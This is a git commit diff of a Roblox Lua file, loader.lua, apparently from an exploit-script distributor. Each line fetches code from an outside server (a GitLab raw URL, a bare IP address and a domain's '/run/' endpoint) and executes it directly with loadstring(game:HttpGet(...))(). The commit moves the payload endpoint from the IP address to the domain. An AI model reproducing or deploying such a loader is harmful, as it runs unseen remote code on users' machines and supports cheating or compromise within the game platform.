1ab8bc93aec0e83d51994734b354c245e0362247
RobloxScriptsV2 <mernaif3@gmail.com>
2026-03-25 07:27:02 +0800

    loader.lua

--- loader.lua
+++ loader.lua
@@ -1,4 +1,4 @@
 ID="4c78314a-bc55-43c0-9947-1c9db37afdab"
 RUN_AFTER=loadstring(game:HttpGet("https://gitlab.com/rlbx-scripts/elysium/-/raw/main/adm-visual"))()
 
-loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjRjNzgzMTRhLWJjNTUtNDNjMC05OTQ3LTFjOWRiMzdhZmRhYiIsImtpbmQiOiJsb2FkZXIifQ"))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjRjNzgzMTRhLWJjNTUtNDNjMC05OTQ3LTFjOWRiMzdhZmRhYiIsImtpbmQiOiJsb2FkZXIifQ"))()
